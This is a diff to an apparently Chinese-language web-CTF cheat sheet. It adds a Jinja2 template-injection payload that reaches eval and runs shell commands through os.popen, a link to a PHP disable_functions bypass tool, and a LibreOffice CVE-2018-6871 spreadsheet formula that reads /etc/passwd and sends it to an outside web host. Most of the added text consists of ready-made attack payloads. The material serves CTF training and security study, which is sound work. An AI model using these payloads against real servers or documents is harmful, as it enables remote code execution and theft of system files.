@@ -653,7 +653,7 @@ echo file_get_contents('bar/etc/passwd');
     - PHP 7.4 feature
     - preloading + ffi
     - e.g. RCTF 2019 - nextphp
-
+- [Extension](https://github.com/w181496/FuckFastcgi)
 - [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
 - 族繁不及備載......        
 
@@ -1879,6 +1879,20 @@ Server-Side Template Injection
 
 - RCE (another way)
     - `{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('ls').read()}}`
+- Python3 RCE
+        - ```python
+          {% for c in [].__class__.__base__.__subclasses__() %}
+            {% if c.__name__ == 'catch_warnings' %}
+              {% for b in c.__init__.__globals__.values() %}
+              {% if b.__class__ == {}.__class__ %}
+                {% if 'eval' in b.keys() %}
+                  {{ b['eval']('__import__("os").popen("id").read()') }}
+                {% endif %}
+              {% endif %}
+              {% endfor %}
+            {% endif %}
+          {% endfor %}
+          ```
 - 過濾中括號
     - `__getitem__`
     - `{{''.__class__.__mro__.__getitem__(2)}}`
@@ -2013,6 +2027,13 @@ http://[::]
         - 實測libcurl 7.47可work
     - Java原生可列目錄
     - Perl/Ruby open Command Injection
+
+- Libreoffice CVE-2018-6871
+    - 可以使用`WEBSERVICE`讀本地檔案，e.g.`/etc/passwd`
+    - 讀出來可以用http往外傳
+        - `=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;))`
+        - e.g. DCTF 2018 final, FBCTF 2019
+    - Example Payload: [Link](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)
 
 ## 遠程利用
 - Gopher
